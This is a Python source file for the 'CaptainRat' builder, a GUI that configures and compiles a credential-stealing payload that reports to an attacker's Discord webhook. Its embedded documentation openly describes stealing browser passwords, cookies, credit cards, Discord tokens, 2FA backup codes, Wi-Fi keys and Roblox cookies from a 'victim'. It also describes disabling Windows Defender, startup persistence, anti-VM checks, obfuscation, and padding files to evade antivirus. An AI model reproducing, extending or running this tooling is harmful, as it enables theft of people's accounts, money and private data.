import copy
import os
import random
import re
import shutil
import string
import subprocess
import threading
import time
from tkinter import filedialog

import customtkinter
import requests
from PIL import Image


class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        self.title("CaptainRat v0.9")
        self.geometry("850x500")
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)
        self.dark_mode()

        self.updated_dictionary = {
            "webhook": None,
            "ping": False,
            "pingtype": None,
            "error": False,
            "startup": False,
            "defender": False,
            "systeminfo": False,
            "backupcodes": False,
            "browser": False,
            "roblox": False,
            "obfuscation": False,
            "injection": False,
            "minecraft": False,
            "wifi": False,
            "killprotector": False,
            "antidebug_vm": False,
            "discord": False,
            "anti_spam": False,
            "self_destruct": False
        }

        # Color scheme - Yellow/Gold theme with black
        self.primary_color = "#D4A017"
        self.primary_hover = "#FFC125"
        self.secondary_color = "#B8860B"
        self.accent_color = "#FFD700"
        self.bg_dark = "#0d0d0d"
        self.bg_medium = "#141414"
        self.bg_card = "#1a1a1a"
        self.text_color = "#FFFFFF"

        # Font
        self.font = "Consolas"

        # Setup paths
        self.basefilepath = os.path.dirname(os.path.realpath(__file__))
        image_path = os.path.join(self.basefilepath, "gui_images")

        # Load images with error handling
        try:
            self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "captain.png")), size=(40, 40))
            self.iconpath = None
            try:
                self.iconbitmap(os.path.join(image_path, "captain.ico"))
            except:
                pass
        except Exception as e:
            print(f"Warning: Could not load images: {e}")
            self.logo_image = None

        # Navigation Frame - Minimal sidebar with centered content
        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color=self.bg_dark, width=200)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(0, weight=1)
        self.navigation_frame.grid_rowconfigure(1, weight=0)
        self.navigation_frame.grid_rowconfigure(2, weight=1)
        self.navigation_frame.grid_columnconfigure(0, weight=1)
        self.navigation_frame.grid_propagate(False)

        # Center container for logo and subtitle
        self.center_container = customtkinter.CTkFrame(self.navigation_frame, fg_color="transparent")
        self.center_container.grid(row=1, column=0)

        # Logo section
        if self.logo_image:
            self.navigation_frame_label = customtkinter.CTkLabel(
                self.center_container, 
                text="CaptainRat", 
                image=self.logo_image,
                compound="top", 
                font=customtkinter.CTkFont(size=18, weight="bold", family=self.font),
                text_color=self.accent_color
            )
        else:
            self.navigation_frame_label = customtkinter.CTkLabel(
                self.center_container, 
                text="CaptainRat", 
                font=customtkinter.CTkFont(size=18, weight="bold", family=self.font),
                text_color=self.accent_color
            )
        self.navigation_frame_label.pack(pady=(0, 5))

        self.subtitle_label = customtkinter.CTkLabel(
            self.center_container,
            text="Builder v0.9",
            font=customtkinter.CTkFont(size=12, family=self.font),
            text_color=self.secondary_color
        )
        self.subtitle_label.pack(pady=(0, 15))

        # Separator line
        self.separator = customtkinter.CTkFrame(self.center_container, height=1, width=150, fg_color=self.secondary_color)
        self.separator.pack(pady=(0, 15))
       

        # Builder Frame - Main content area
        self.builder_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color=self.bg_medium)
        self.builder_frame.grid_columnconfigure(0, weight=1)

        # Header section
        self.header_frame = customtkinter.CTkFrame(self.builder_frame, fg_color="transparent")
        self.header_frame.grid(row=0, column=0, sticky="ew", padx=25, pady=(20, 10))
        self.header_frame.grid_columnconfigure(0, weight=1)

        self.webhook_button = customtkinter.CTkEntry(
            self.header_frame, 
            height=42, 
            font=customtkinter.CTkFont(size=13, family=self.font), 
            placeholder_text="Enter Discord Webhook URL",
            border_color=self.secondary_color,
            fg_color=self.bg_dark,
            corner_radius=8,
            border_width=1
        )
        self.webhook_button.grid(row=0, column=0, sticky="ew", padx=(0, 10))

        self.checkwebhook_button = customtkinter.CTkButton(
            self.header_frame, 
            width=120, 
            height=42, 
            text="Verify",
            command=self.check_webhook_button,
            fg_color=self.primary_color, 
            hover_color=self.primary_hover, 
            font=customtkinter.CTkFont(size=13, weight="bold", family=self.font),
            corner_radius=8,
            text_color=self.bg_dark
        )
        self.checkwebhook_button.grid(row=0, column=1)

        # Title section
        self.title_frame = customtkinter.CTkFrame(self.builder_frame, fg_color="transparent")
        self.title_frame.grid(row=1, column=0, sticky="ew", padx=25, pady=(10, 5))

        self.all_options = customtkinter.CTkLabel(
            self.title_frame, 
            text="Configuration", 
            font=customtkinter.CTkFont(size=22, weight="bold", family=self.font),
            text_color=self.accent_color
        )
        self.all_options.pack(side="left")

        self.option_help = customtkinter.CTkButton(
            self.title_frame, 
            width=30, 
            height=30,
            text="?",
            command=self.docs_button_event, 
            fg_color=self.secondary_color, 
            hover_color=self.primary_hover,
            corner_radius=6,
            font=customtkinter.CTkFont(size=14, weight="bold", family=self.font),
            text_color=self.bg_dark
        )
        self.option_help.pack(side="right")

        # Options container with cards
        self.options_container = customtkinter.CTkFrame(self.builder_frame, fg_color="transparent")
        self.options_container.grid(row=2, column=0, sticky="nsew", padx=25, pady=10)
        self.options_container.grid_columnconfigure((0, 1, 2), weight=1)

        # Card 1 - General Options
        self.card1 = customtkinter.CTkFrame(self.options_container, fg_color=self.bg_card, corner_radius=12, border_width=1, border_color=self.secondary_color)
        self.card1.grid(row=0, column=0, sticky="nsew", padx=6, pady=6)
        
        self.card1_title = customtkinter.CTkLabel(
            self.card1, 
            text="General", 
            font=customtkinter.CTkFont(size=15, weight="bold", family=self.font),
            text_color=self.accent_color
        )
        self.card1_title.pack(pady=(12, 8))

        self.startup = customtkinter.CTkCheckBox(
            self.card1, 
            text="Add To Startup", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.startup.pack(anchor="w", padx=15, pady=4)

        self.error = customtkinter.CTkCheckBox(
            self.card1, 
            text="Fake Error", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.error.pack(anchor="w", padx=15, pady=4)

        self.defender = customtkinter.CTkCheckBox(
            self.card1, 
            text="Disable Defender", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.defender.pack(anchor="w", padx=15, pady=4)

        self.killprotector = customtkinter.CTkCheckBox(
            self.card1, 
            text="Kill Protector", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.killprotector.pack(anchor="w", padx=15, pady=4)

        self.antidebug_vm = customtkinter.CTkCheckBox(
            self.card1, 
            text="Anti Debug/VM", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.antidebug_vm.pack(anchor="w", padx=15, pady=4)

        self.antispam = customtkinter.CTkCheckBox(
            self.card1, 
            text="Anti Spam", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.antispam.pack(anchor="w", padx=15, pady=4)

        self.self_destruct = customtkinter.CTkCheckBox(
            self.card1, 
            text="Self Destruct", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.self_destruct.pack(anchor="w", padx=15, pady=(4, 12))

        # Card 2 - Data Collection
        self.card2 = customtkinter.CTkFrame(self.options_container, fg_color=self.bg_card, corner_radius=12, border_width=1, border_color=self.secondary_color)
        self.card2.grid(row=0, column=1, sticky="nsew", padx=6, pady=6)
        
        self.card2_title = customtkinter.CTkLabel(
            self.card2, 
            text="Data Collection", 
            font=customtkinter.CTkFont(size=15, weight="bold", family=self.font),
            text_color=self.accent_color
        )
        self.card2_title.pack(pady=(12, 8))

        self.systeminfo = customtkinter.CTkCheckBox(
            self.card2, 
            text="System Info", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.systeminfo.pack(anchor="w", padx=15, pady=4)

        self.discord = customtkinter.CTkCheckBox(
            self.card2, 
            text="Discord Info", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.discord.pack(anchor="w", padx=15, pady=4)

        self.browser = customtkinter.CTkCheckBox(
            self.card2, 
            text="Browser Info", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.browser.pack(anchor="w", padx=15, pady=4)

        self.wifi = customtkinter.CTkCheckBox(
            self.card2, 
            text="Wifi Info", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.wifi.pack(anchor="w", padx=15, pady=4)

        self.backupcodes = customtkinter.CTkCheckBox(
            self.card2, 
            text="2FA Codes", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.backupcodes.pack(anchor="w", padx=15, pady=4)

        self.injection = customtkinter.CTkCheckBox(
            self.card2, 
            text="Injection", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.injection.pack(anchor="w", padx=15, pady=4)

        self.obfuscation = customtkinter.CTkCheckBox(
            self.card2, 
            text="Obfuscation", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            command=self.check_cxfreeze,
            text_color=self.text_color
        )
        self.obfuscation.pack(anchor="w", padx=15, pady=(4, 12))

        # Card 3 - Game Info & Alerts
        self.card3 = customtkinter.CTkFrame(self.options_container, fg_color=self.bg_card, corner_radius=12, border_width=1, border_color=self.secondary_color)
        self.card3.grid(row=0, column=2, sticky="nsew", padx=6, pady=6)
        
        self.card3_title = customtkinter.CTkLabel(
            self.card3, 
            text="Game Info & Alerts", 
            font=customtkinter.CTkFont(size=15, weight="bold", family=self.font),
            text_color=self.accent_color
        )
        self.card3_title.pack(pady=(12, 8))

        self.roblox = customtkinter.CTkCheckBox(
            self.card3, 
            text="Roblox Info", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            command=self.check_roblox,
            text_color=self.text_color
        )
        self.roblox.pack(anchor="w", padx=15, pady=4)

        self.minecraft = customtkinter.CTkCheckBox(
            self.card3, 
            text="Minecraft Info", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.minecraft.pack(anchor="w", padx=15, pady=4)

        # Ping section
        self.ping_frame = customtkinter.CTkFrame(self.card3, fg_color="transparent")
        self.ping_frame.pack(anchor="w", padx=15, pady=4, fill="x")

        self.ping = customtkinter.CTkCheckBox(
            self.ping_frame, 
            text="Ping", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            command=self.check_ping, 
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            text_color=self.text_color
        )
        self.ping.pack(side="left")

        self.pingtype = customtkinter.CTkOptionMenu(
            self.ping_frame, 
            width=90, 
            height=26,
            values=["@everyone", "@here"],
            font=customtkinter.CTkFont(size=11, family=self.font),
            fg_color=self.bg_dark, 
            button_hover_color=self.primary_hover, 
            button_color=self.secondary_color,
            corner_radius=6,
            text_color=self.text_color
        )
        self.pingtype.set(value="@here")
        self.pingtype.pack(side="right", padx=(10, 0))
        self.pingtype.configure(state="disabled")

        # Pumper section
        self.pump_frame = customtkinter.CTkFrame(self.card3, fg_color="transparent")
        self.pump_frame.pack(anchor="w", padx=15, pady=4, fill="x")

        self.pump = customtkinter.CTkCheckBox(
            self.pump_frame, 
            text="File Pumper", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover,
            border_color=self.secondary_color,
            checkmark_color=self.bg_dark,
            command=self.check_pumper,
            text_color=self.text_color
        )
        self.pump.pack(side="left")

        self.pump_size = customtkinter.CTkOptionMenu(
            self.pump_frame, 
            width=70, 
            height=26,
            font=customtkinter.CTkFont(size=11, family=self.font), 
            values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], 
            fg_color=self.bg_dark, 
            button_hover_color=self.primary_hover, 
            button_color=self.secondary_color,
            corner_radius=6,
            text_color=self.text_color
        )
        self.pump_size.pack(side="right", padx=(10, 0))
        self.pump_size.set("10mb")
        self.pump_size.configure(state="disabled")

        # Build section
        self.build_frame = customtkinter.CTkFrame(self.builder_frame, fg_color="transparent")
        self.build_frame.grid(row=3, column=0, sticky="ew", padx=25, pady=(15, 20))
        self.build_frame.grid_columnconfigure((0, 1, 2, 3), weight=1)

        self.fileopts = customtkinter.CTkOptionMenu(
            self.build_frame, 
            values=["pyinstaller", "cxfreeze", ".py"],
            font=customtkinter.CTkFont(size=13, weight="bold", family=self.font), 
            width=160, 
            height=42,
            fg_color=self.bg_dark, 
            button_hover_color=self.primary_hover, 
            button_color=self.secondary_color, 
            command=self.multi_commands,
            corner_radius=8,
            text_color=self.text_color
        )
        self.fileopts.grid(row=0, column=0, padx=6, sticky="ew")
        self.fileopts.set("Build Type")

        self.filename = customtkinter.CTkEntry(
            self.build_frame, 
            height=42,
            font=customtkinter.CTkFont(size=13, family=self.font),
            placeholder_text="File Name",
            border_color=self.secondary_color,
            fg_color=self.bg_dark,
            corner_radius=8,
            border_width=1
        )
        self.filename.grid(row=0, column=1, padx=6, sticky="ew")

        self.icon = customtkinter.CTkButton(
            self.build_frame, 
            height=42,
            text="Add Icon", 
            fg_color=self.bg_dark, 
            hover_color=self.secondary_color,
            font=customtkinter.CTkFont(size=13, weight="bold", family=self.font), 
            command=self.get_icon,
            corner_radius=8,
            border_width=1,
            border_color=self.secondary_color,
            text_color=self.text_color
        )
        self.icon.grid(row=0, column=2, padx=6, sticky="ew")
        self.icon.configure(state="disabled")

        self.build = customtkinter.CTkButton(
            self.build_frame, 
            height=42,
            text="BUILD", 
            font=customtkinter.CTkFont(size=14, weight="bold", family=self.font),
            fg_color=self.primary_color, 
            hover_color=self.primary_hover, 
            command=self.buildfile,
            corner_radius=8,
            text_color=self.bg_dark
        )
        self.build.grid(row=0, column=3, padx=6, sticky="ew")

        self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.backupcodes, self.browser,
                           self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.killprotector, self.antidebug_vm, self.discord]

        for checkbox in self.checkboxes:
            checkbox.bind("<Button-1>", self.update_config)

        # Frame 2 - Documentation
        self.second_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color=self.bg_medium)
        self.second_frame.grid_columnconfigure(0, weight=1)
        self.second_frame.grid_rowconfigure(1, weight=1)

        self.docs_header = customtkinter.CTkFrame(self.second_frame, fg_color="transparent")
        self.docs_header.grid(row=0, column=0, sticky="ew", padx=25, pady=(20, 10))

        self.back_button = customtkinter.CTkButton(
            self.docs_header,
            width=80,
            height=35,
            text="Back",
            command=self.home_button_event,
            fg_color=self.secondary_color,
            hover_color=self.primary_hover,
            font=customtkinter.CTkFont(size=13, weight="bold", family=self.font),
            corner_radius=8,
            text_color=self.bg_dark
        )
        self.back_button.pack(side="left")

        self.docs = customtkinter.CTkLabel(
            self.docs_header, 
            text="Documentation", 
            font=customtkinter.CTkFont(size=22, weight="bold", family=self.font),
            text_color=self.accent_color
        )
        self.docs.pack(side="left", padx=(20, 0))

        self.docsbox = customtkinter.CTkTextbox(
            self.second_frame, 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.bg_dark,
            border_color=self.secondary_color,
            border_width=1,
            corner_radius=12,
            text_color=self.text_color
        )
        self.docsbox.grid(row=1, column=0, sticky="nsew", padx=25, pady=(10, 25))
        self.docsbox.insert(
            "0.0",
            """
================================================================================
                         CAPTAINRAT BUILDER DOCUMENTATION
================================================================================


GENERAL OPTIONS
--------------------------------------------------------------------------------

  Add To Startup
    Adds the file to the startup folder. When the PC turns on, the file 
    runs automatically and sends information to your webhook.

  Fake Error
    Displays a fake error popup when the file runs to confuse the victim.

  Disable Defender
    Attempts to disable Windows Defender on the target system.

  Kill Protector
    Kills Discord protector processes that some users have to prevent 
    token theft.

  Anti Debug/VM
    Checks if running in a virtual machine or being debugged and exits 
    if detected.

  Anti Spam
    Only allows the file to execute every 60 seconds to prevent webhook 
    rate limiting.

  Self Destruct
    Deletes the file after execution so it can't be run again.


DATA COLLECTION OPTIONS
--------------------------------------------------------------------------------

  System Info
    Collects: PC name, OS, IP address, MAC address, HWID, CPU, GPU, RAM.

  Discord Info
    Collects: Email, phone, 2FA status, Nitro type, token, gift cards.

  Browser Info
    Collects: Passwords, history, cookies, credit cards from browsers.

  Wifi Info
    Collects: Wifi passwords and network information.

  2FA Codes
    Retrieves Discord authentication backup codes.

  Injection
    Injects a script into Discord to capture credential changes.

  Obfuscation
    Makes source code unreadable to prevent webhook tampering.

GAME INFO OPTIONS
--------------------------------------------------------------------------------

  Roblox Info
    Collects: Username, Roblox cookie, Robux amount.

  Minecraft Info
    Collects: Session info and user cache.


NOTIFICATION OPTIONS
--------------------------------------------------------------------------------

  Ping
    Pings you when information is sent to your webhook.

  Ping Type
    @everyone - Pings everyone in the channel
    @here - Pings active users in the channel


BUILD OPTIONS
--------------------------------------------------------------------------------

  PyInstaller
    + Single executable file
    + Fast compilation
    - Detected by antiviruses
    - Large file size

  CxFreeze
    + Smaller file size
    + Better AV evasion
    - Multiple files required
    - Slower compilation

  File Pumper
    Adds extra bytes to increase file size, helping evade some antiviruses.


================================================================================
""")

        self.select_frame_by_name("home")

    def select_frame_by_name(self, name):
        if name == "home":
            self.builder_frame.grid(row=0, column=1, sticky="nsew")
            self.second_frame.grid_forget()
        elif name == "frame_2":
            self.second_frame.grid(row=0, column=1, sticky="nsew")
            self.builder_frame.grid_forget()

    def home_button_event(self):
        self.select_frame_by_name("home")

    def docs_button_event(self):
        self.select_frame_by_name("frame_2")

    def dark_mode(self):
        customtkinter.set_appearance_mode("dark")

    def verify_webhook(self):
        webhook = self.webhook_button.get()
        try:
            r = requests.get(webhook, timeout=5)
            if r.status_code == 200:
                return True
            else:
                return False
        except requests.exceptions.RequestException:
            return False

    def check_webhook_button(self):
        if self.verify_webhook():
            self.checkwebhook_button.configure(fg_color="#228B22", hover_color="#32CD32",
                                               text="Valid", font=customtkinter.CTkFont(size=13, weight="bold", family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)
            self.updated_dictionary["webhook"] = self.webhook_button.get()
        else:
            self.checkwebhook_button.configure(fg_color="#DC143C", hover_color="#FF6347",
                                               text="Invalid", font=customtkinter.CTkFont(size=13, weight="bold", family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)

    def check_ping(self):
        if self.ping.get() == 1:
            self.pingtype.configure(state="normal")
        else:
            self.pingtype.configure(state="disabled")

    def check_pumper(self):
        if self.pump.get() == 1:
            self.pump_size.configure(state="normal")
        else:
            self.pump_size.configure(state="disabled")

    def multi_commands(self, value):
        if value == "pyinstaller":
            self.check_icon()
        elif value == "cxfreeze":
            self.check_cxfreeze()
            self.check_icon()
        elif value == ".py":
            self.check_icon()

    def get_mb(self):
        self.mb = self.pump_size.get()
        byte_size = int(self.mb.replace("mb", ""))
        return byte_size

    def check_roblox(self):
        if self.roblox.get() == 1:
            self.browser.select()

    def check_icon(self):
        if self.fileopts.get() == "pyinstaller":
            self.icon.configure(state="normal")
        elif self.fileopts.get() == "cxfreeze":
            self.icon.configure(state="normal")
        elif self.fileopts.get() == ".py":
            self.icon.configure(state="disabled")

    def check_cxfreeze(self):
        if self.fileopts.get() == "cxfreeze":
            if self.obfuscation.get() == 1:
                self.obfuscation.deselect()

    def get_icon(self):
        self.iconpath = filedialog.askopenfilename(initialdir="/", title="Select Icon", filetypes=(("ico files", "*.ico"), ("all files", "*.*")))
        if self.iconpath:
            self.icon.configure(text="Icon Added", fg_color=self.secondary_color)
            self.builder_frame.after(3500, self.reset_icon_button)

    def reset_icon_button(self):
        self.icon.configure(text="Add Icon", fg_color=self.bg_dark, hover_color=self.secondary_color)

    def update_config(self, event):
        checkbox_mapping = {
            "webhook": self.webhook_button,
            "ping": self.ping,
            "pingtype": self.pingtype,
            "error": self.error,
            "startup": self.startup,
            "defender": self.defender,
            "systeminfo": self.systeminfo,
            "backupcodes": self.backupcodes,
            "browser": self.browser,
            "roblox": self.roblox,
            "obfuscation": self.obfuscation,
            "injection": self.injection,
            "minecraft": self.minecraft,
            "wifi": self.wifi,
            "killprotector": self.killprotector,
            "antidebug_vm": self.antidebug_vm,
            "discord": self.discord,
            "anti_spam": self.antispam,
            "self_destruct": self.self_destruct
        }

        for key, checkbox in checkbox_mapping.items():
            if checkbox.get():
                if key == "webhook":
                    pass
                else:
                    self.updated_dictionary[key] = True
            elif checkbox.get() == 0:
                self.updated_dictionary[key] = False
            ping_message = self.pingtype.get()
            if ping_message in ["Here", "Everyone"]:
                self.updated_dictionary["pingtype"] = ping_message
            elif self.ping.get() == 0:
                self.updated_dictionary["pingtype"] = "None"

    def get_filetype(self):
        file_type = self.fileopts.get()
        if file_type == ".py":
            return file_type.replace(".", "")
        else:
            return file_type

    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color=self.primary_color, hover_color=self.primary_hover, text="Verify")

    def reset_build_button(self):
        self.build.configure(text="BUILD", font=customtkinter.CTkFont(size=14, weight="bold", family=self.font),
                             fg_color=self.primary_color, hover_color=self.primary_hover)

    def building_button_thread(self, thread):
        while thread.is_alive():
            for i in [".", "..", "..."]:
                self.build.configure(text=f"Building{i}", font=customtkinter.CTkFont(size=14, weight="bold", family=self.font), 
                                    fg_color=self.secondary_color, hover_color=self.primary_hover)
                time.sleep(0.3)
                self.update()

    def built_file(self):
        self.build.configure(text="Built", font=customtkinter.CTkFont(size=14, weight="bold", family=self.font),
                             fg_color="#228B22", hover_color="#32CD32")

    def return_filename(self):
        get_file_name = self.filename.get()
        if not get_file_name:
            random_name = ''.join(random.choices(string.ascii_letters, k=5))
            return f"test-{random_name}"
        else:
            return get_file_name

    def get_config(self):
        with open(self.basefilepath + "\\captain.py", 'r', encoding="utf-8") as f:
            code = f.read()

        config_regex = r"__CONFIG__\s*=\s*{(.*?)}"
        config_match = re.search(config_regex, code, re.DOTALL)
        if config_match:
            config = config_match.group(0)
        else:
            raise Exception("Could not find config in captain.py")

        copy_dict = copy.deepcopy(self.updated_dictionary)
        config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
        code = code.replace(config, config_str)

        return code

    def file_pumper(self, filename, extension, size):
        pump_size = size * 1024 ** 2
        with open(f"./{filename}.{extension}", 'ab') as f:
            for _ in range(int(pump_size)):
                f.write((b'\x00'))

    def compile_file(self, filename, filetype):
        if self.iconpath is None:
            exeicon = "NONE"
        else:
            exeicon = self.iconpath

        if filetype == "pyinstaller":
            subprocess.run(["python", "./tools/upx.py"])
            subprocess.run(["python", "-m", "PyInstaller",
                            "--onefile", "--clean", "--noconsole",
                            "--upx-dir=./tools", "--distpath=./",
                            "--hidden-import", "base64",
                            "--hidden-import", "ctypes",
                            "--hidden-import", "json",
                            "--hidden-import", "re",
                            "--hidden-import", "time",
                            "--hidden-import", "subprocess",
                            "--hidden-import", "sys",
                            "--hidden-import", "sqlite3",
                            "--hidden-import", "requests_toolbelt",
                            "--hidden-import", "psutil",
                            "--hidden-import", "PIL",
                            "--hidden-import", "PIL.ImageGrab",
                            "--hidden-import", "Cryptodome",
                            "--hidden-import", "Cryptodome.Cipher",
                            "--hidden-import", "Cryptodome.Cipher.AES",
                            "--hidden-import", "win32crypt",
                            "--hidden-import", "cv2",
                            "--icon", exeicon, f"./{filename}.py"])

        elif filetype == "cxfreeze":
            cmd_args = [
                "cxfreeze",
                f"{filename}.py",
                "--target-name", filename,
                "--base-name", "Win32GUI",
                "--includes", "base64",
                "--includes", "ctypes",
                "--includes", "json",
                "--includes", "re",
                "--includes", "time",
                "--includes", "subprocess",
                "--includes", "sys",
                "--includes", "sqlite3",
                "--includes", "requests_toolbelt",
                "--includes", "psutil",
                "--includes", "PIL",
                "--includes", "PIL.ImageGrab",
                "--includes", "Cryptodome",
                "--includes", "Cryptodome.Cipher",
                "--includes", "Cryptodome.Cipher.AES",
                "--includes", "win32crypt"
            ]
            if exeicon != "NONE":
                cmd_args += ["--icon", exeicon]
            subprocess.run(cmd_args)

    def cleanup_files(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.spec', f'./{filename}.py', "./tools/upx.exe"}

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue
        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue

    def write_and_obfuscate(self, filename):
        with open(f"./{filename}.py", 'w', encoding="utf-8") as f:
            f.write(self.get_config())

        if self.obfuscation.get() == 1:
            os.system(f"python ./tools/obfuscation.py ./{filename}.py")
            os.remove(f"./{filename}.py")
            os.rename(f"./Obfuscated_{filename}.py", f"./{filename}.py")

    def buildfile(self):
        filename = self.return_filename()

        if self.get_filetype() == "py":
            self.write_and_obfuscate(filename)

            if self.pump.get() == 1:
                self.file_pumper(filename, "py", self.get_mb())

            self.built_file()
            self.builder_frame.after(3000, self.reset_build_button)

        elif self.get_filetype() == "pyinstaller":
            self.write_and_obfuscate(filename)

            thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
            thread.start()
            self.building_button_thread(thread)

            if self.pump.get() == 1:
                self.file_pumper(filename, "exe", self.get_mb())

            self.built_file()
            self.builder_frame.after(3000, self.reset_build_button)
            self.cleanup_files(filename)

        elif self.get_filetype() == "cxfreeze":
            self.write_and_obfuscate(filename)

            thread = threading.Thread(target=self.compile_file, args=(filename, "cxfreeze",))
            thread.start()
            self.building_button_thread(thread)

            if self.pump.get() == 1:
                self.file_pumper(filename, "exe", self.get_mb())

            self.built_file()
            self.builder_frame.after(3000, self.reset_build_button)
            os.remove(f"./{filename}.py")


if __name__ == "__main__":
    app = App()
    app.mainloop()